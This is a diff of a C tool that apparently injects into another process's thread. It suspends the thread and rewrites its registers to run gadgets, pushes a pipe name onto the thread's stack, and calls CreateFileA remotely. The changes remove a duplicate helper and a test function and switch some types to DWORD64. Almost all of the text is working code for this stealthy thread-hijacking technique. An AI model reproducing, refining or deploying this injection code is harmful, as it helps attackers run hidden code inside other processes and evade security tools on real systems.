@@ -119,7 +119,6 @@ DWORD64 pushm(HANDLE thd, Gadgets gadgets, DWORD64 data) {
     ctx.Rdx = data;
     ctx.Rax = gadgets.jmps;
 
-
     SetThreadContext(thd, &ctx);
     ResumeThread(thd);
     Sleep(2);
@@ -145,25 +144,6 @@ void push_junk(HANDLE hThread, Gadgets gadgets) {
     SuspendThread(hThread);
 }
 
-//push val to stack, but returns return val of previous fn called (in eax)
-DWORD64 get_ret_push_old(HANDLE hThread, Gadgets gadgets, DWORD64 data) {
-
-    CONTEXT ctx = {.ContextFlags = CONTEXT_FULL};
-    SuspendThread(hThread);
-    
-    GetThreadContext(hThread, &ctx);
-
-    ctx.Rip = gadgets.pshc;
-    DWORD64 addr = ctx.Rax;
-    ctx.Rdx = data;
-    ctx.Rax = gadgets.jmps;
-
-    SetThreadContext(hThread, &ctx);
-    ResumeThread(hThread);
-    Sleep(2);
-    SuspendThread(hThread);
-    return addr;
-}
 
 //push val to stack, but returns return val of previous fn called (in eax)
 DWORD64 get_ret_val(HANDLE hThread, Gadgets gadgets) {
@@ -173,30 +153,7 @@ DWORD64 get_ret_val(HANDLE hThread, Gadgets gadgets) {
 
     GetThreadContext(hThread, &ctx);
     return ctx.Rax;
-
-    //ctx.Rip = gadgets.pshc;
-    //DWORD64 addr = ctx.Rax;
-    //ctx.Rdx = data;
-    //ctx.Rax = gadgets.jmps;
-
-    //SetThreadContext(hThread, &ctx);
-    //ResumeThread(hThread);
-    //Sleep(2);
-    //SuspendThread(hThread);
-    //return addr;
 }
-
-void TestFunc(DWORD64 a, DWORD64 b, DWORD64 c, DWORD64 d, DWORD64 e, DWORD64 f, DWORD64 g) {
-    printf("a: %llu\n", a);
-    printf("b: %llu\n", b);
-    printf("c: %llu\n", c);
-    printf("d: %llu\n", d);
-    printf("e: %llu\n", e);
-    printf("f: %llu\n", f);
-    printf("g: %llu\n", g);
-    //printf("h: %llu\n", h);
-}
-
 
 DWORD WINAPI ThreadFunc(LPVOID lpParam) {
     char test[100] = {0};
@@ -207,7 +164,7 @@ DWORD WINAPI ThreadFunc(LPVOID lpParam) {
     return 0;
 }
 
-DWORD64 CallFuncRemote(HANDLE hThread, Gadgets gadgets, void* funcAddr, BOOL alignStack, BOOL returnVal, const uint64_t count, const DWORD64 parameters[]) {
+DWORD64 CallFuncRemote(HANDLE hThread, Gadgets gadgets, DWORD64 funcAddr, BOOL alignStack, BOOL returnVal, const uint64_t count, const DWORD64 parameters[]) {
 
     // 1. Check/Fix Stack
     if (alignStack) {
@@ -318,8 +275,8 @@ int main(void) {
     printf("[*] Pipe name injected to stack\n");
 
     // CreateFileA
-    HANDLE phand = (HANDLE)CallFuncRemote(hThread, gadgets, fnCreateFileA, TRUE, TRUE, 7, (DWORD64[]) { namptr, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0});
-    if (phand == INVALID_HANDLE_VALUE) {
+    DWORD64 phand = CallFuncRemote(hThread, gadgets, fnCreateFileA, TRUE, TRUE, 7, (DWORD64[]) { namptr, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0});
+    if ((HANDLE)phand == INVALID_HANDLE_VALUE) {
         printf("[!] CreateFileA returned a bad HANDLE\n");
         return 1;
     }
